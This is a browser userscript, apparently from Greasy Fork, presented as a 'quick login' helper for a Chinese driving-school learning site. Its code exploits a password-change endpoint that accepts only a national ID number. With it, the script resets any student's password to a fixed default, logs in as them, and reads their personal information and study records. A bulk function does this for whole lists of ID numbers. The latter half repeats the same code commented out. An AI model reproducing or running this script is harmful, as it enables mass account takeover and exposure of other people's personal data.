// ==UserScript==
// @name         无忧乐行快速登录
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  无忧乐行快速登录的功能
// @author       You
// @match        *://5u5u5u5u.com/studentLogin.action
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/434444/%E6%97%A0%E5%BF%A7%E4%B9%90%E8%A1%8C%E5%BF%AB%E9%80%9F%E7%99%BB%E5%BD%95.user.js
// @updateURL https://update.greasyfork.org/scripts/434444/%E6%97%A0%E5%BF%A7%E4%B9%90%E8%A1%8C%E5%BF%AB%E9%80%9F%E7%99%BB%E5%BD%95.meta.js
// ==/UserScript==

const DEFAULT_PASSWORD = 'Aa123456';
const WSEESIONID = '';

/**
 * 修改密码
 * @param {string} idNumber 身份证号码
 * @param {string} password 新密码
 * @returns {Promise<boolean>} 是否修改成功
 */
function modifyPsw(idNumber, password = DEFAULT_PASSWORD) {
  return fetch(`/modifyPsw.action?npsw=${password}&dengbao=dengbao&median=${idNumber}`)
    .then((res) => res.text())
    .then((resText) => resText === '"success"' || resText === '"您输入的新密码不能与原密码一致，请重新输入！"');
}
window.modifyPsw = modifyPsw;
window.multiCheck = async (txt) => {
  const a = txt.split('\n');
  a.shift();
  const result = (await Promise.allSettled(a.map(i => modifyPsw(i)))).filter((item ,index) => {
    item.index = index;
    return item.value;
  }).map(item => a[item.index]);
  return result;
}

/**
 * 获取学员的驾校报名记录
 * @param {string} idNumber 身份证号码
 * @param {string} password 密码
 * @returns {Promise<{
 *   busOrg: string;
 *   id: string;
 *   learnstatus: string;
 *   name: string;
 *   registTime: string;
 * }[]>} 驾校报名记录，如果身份证号码/密码有误，返回空数组
 */
function queryAllRegistry(idNumber, password = DEFAULT_PASSWORD) {
  return fetch(`/learning_json/queryAllRegistry.action?username=${idNumber}&password=${password}`)
    .then((res) => res.json())
    .then(({ list }) => list || []);
}

/**
 * 登录
 * @param {string} idNumber 身份证号码
 * @param {string} password 密码
 * @param {(string | number)} registry 报名记录 id
 * @returns {Promise<string>} 登录成功后会返回 sessionId，记录了登录凭证
 */
function login(idNumber, password = DEFAULT_PASSWORD, registry = '') {
  return fetch(`/login.action?name=${idNumber}&password=${password}&registry=${registry}`).then(
    (res) => res.url.match(/toLessonList.action;jsessionid=(.*?)\?navigation=1/)?.[1]
  );
}

/**
 * 打开登录链接，可以快速登录
 * @param {string} idNumber 身份证号码
 * @param {string} password 密码
 * @param {Promise<string | number>} registry 报名记录 id
 */
async function openLoginLink(idNumber, password = DEFAULT_PASSWORD, registry = '') {
  const sessionId = await login(idNumber, password, registry);
  if (!sessionId) {
    window.alert('登录失败');
  } else {
    window.open(`/toLessonList.action;jsessionid=${sessionId}`);
  }
}

/**
 * 获取课程列表，包含个人信息、学习进程、学科/课程列表
 * @param {string} sessionId 登录凭证
 * @returns {Promise<{
 *   curStudyState: object;
 *   personalInfo: object;
 *   totalLesson: object;
 * }>}
 */
function lessonListContent(sessionId) {
  return fetch(`/lessonListContent.action;jsessionid=${sessionId}`).then((res) => res.json());
}

/**
 * 获取学科学习进度，也可以拿到学科列表
 * @param {string} sessionId 登录凭证
 * @returns {Promise<object[]>}
 */
function stageList(sessionId) {
  return fetch(`/learning_json/stageList.action;jsessionid=${sessionId}`).then((res) => res.json());
}

/**
 * 获取学习记录
 * @param {string} sessionId 登录凭证
 * @returns {Promise<object[]>}
 */
function toAttendancePage(sessionId) {
  return fetch(`/toAttendancePage.action;jsessionid=${sessionId}?pageNo=0&pageSize=100`)
    .then((res) => res.json())
    .then(({ result }) => result || []);
}


(function () {
  "use strict";

  document.body.innerHTML = `
<div style="
  display: flex;
  flex-direction: column;
  background-color: #f3f3f3;
  align-items: center;
  justify-content: space-between;
  width: 300px;
  margin: 100px auto;
  padding: 20px 0;
  border-radius: 8px;
  box-shadow: 0 0 20px 1px #888;
">
  <input id="input" type="text" class="text_1" placeholder="身份证号码" autocomplete="off">
  <div id="msg" style="color: red; height: 16px; line-height: 16px;"></div>
  <input id="button" type="button" class="button" style="margin-bottom: 0px;" onclick="handleClick()">
</div>
    `;
  window.handleClick = async () => {
    document.getElementById("msg").innerText = "";
    const idnumber = document.getElementById("input").value;
    if (await modifyPsw(idnumber)) {
      window.location.href = `/learning/newhome/selectRegistry.jsp?username=${idnumber}&password=Aa123456`;
    }
  };
})();


// const script = document.createElement('script');
// script.type = 'module';
// script.crossorigin = true;
// script.src = 'http://localhost:5000/assets/index.js';

// const link = document.createElement('link');
// link.rel = 'stylesheet';
// link.href = 'http://localhost:5000/assets/index.css';

// document.documentElement.appendChild(script);
// document.documentElement.appendChild(link);

// const DEFAULT_PASSWORD = 'Aa123456';
// const WSEESIONID = '';

// /**
//  * 修改密码
//  * @param {string} idNumber 身份证号码
//  * @param {string} password 新密码
//  * @returns {Promise<boolean>} 是否修改成功
//  */
//  function modifyPsw(idNumber, password = DEFAULT_PASSWORD) {
//   return fetch(`/modifyPsw.action?npsw=${password}&dengbao=dengbao&median=${idNumber}`)
//     .then((res) => res.text())
//     .then((resText) => resText === '"success"' || resText === '"您输入的新密码不能与原密码一致，请重新输入！"');
// }

// /**
//  * 获取学员的驾校报名记录
//  * @param {string} idNumber 身份证号码
//  * @param {string} password 密码
//  * @returns {Promise<{
//  *   busOrg: string;
//  *   id: string;
//  *   learnstatus: string;
//  *   name: string;
//  *   registTime: string;
//  * }[]>} 驾校报名记录，如果身份证号码/密码有误，返回空数组
//  */
//  function queryAllRegistry(idNumber, password = DEFAULT_PASSWORD) {
//   return fetch(`/learning_json/queryAllRegistry.action?username=${idNumber}&password=${password}`)
//     .then((res) => res.json())
//     .then(({ list }) => list || []);
// }

// /**
//  * 登录
//  * @param {string} idNumber 身份证号码
//  * @param {string} password 密码
//  * @param {(string | number)} registry 报名记录 id
//  * @returns {Promise<string>} 登录成功后会返回 sessionId，记录了登录凭证
//  */
//  function login(idNumber, password = DEFAULT_PASSWORD, registry = '') {
//   return fetch(`/login.action?name=${idNumber}&password=${password}&registry=${registry}`).then(
//     (res) => res.url.match(/toLessonList.action;jsessionid=(.*?)\?navigation=1/)?.[1]
//   );
// }

// /**
//  * 打开登录链接，可以快速登录
//  * @param {string} idNumber 身份证号码
//  * @param {string} password 密码
//  * @param {Promise<string | number>} registry 报名记录 id
//  */
//  async function openLoginLink(idNumber, password = DEFAULT_PASSWORD, registry = '') {
//   const sessionId = await login(idNumber, password, registry);
//   if (!sessionId) {
//     window.alert('登录失败');
//   } else {
//     window.open(`/toLessonList.action;jsessionid=${sessionId}`);
//   }
// }

// /**
//  * 获取课程列表，包含个人信息、学习进程、学科/课程列表
//  * @param {string} sessionId 登录凭证
//  * @returns {Promise<{
//  *   curStudyState: object;
//  *   personalInfo: object;
//  *   totalLesson: object;
//  * }>}
//  */
//  function lessonListContent(sessionId) {
//   return fetch(`/lessonListContent.action;jsessionid=${sessionId}`).then((res) => res.json());
// }

// /**
//  * 获取学科学习进度，也可以拿到学科列表
//  * @param {string} sessionId 登录凭证
//  * @returns {Promise<object[]>}
//  */
//  function stageList(sessionId) {
//   return fetch(`/learning_json/stageList.action;jsessionid=${sessionId}`).then((res) => res.json());
// }

// /**
//  * 获取学习记录
//  * @param {string} sessionId 登录凭证
//  * @returns {Promise<object[]>}
//  */
//  function toAttendancePage(sessionId) {
//   return fetch(`/toAttendancePage.action;jsessionid=${sessionId}?pageNo=0&pageSize=100`)
//     .then((res) => res.json())
//     .then(({ result }) => result || []);
// }

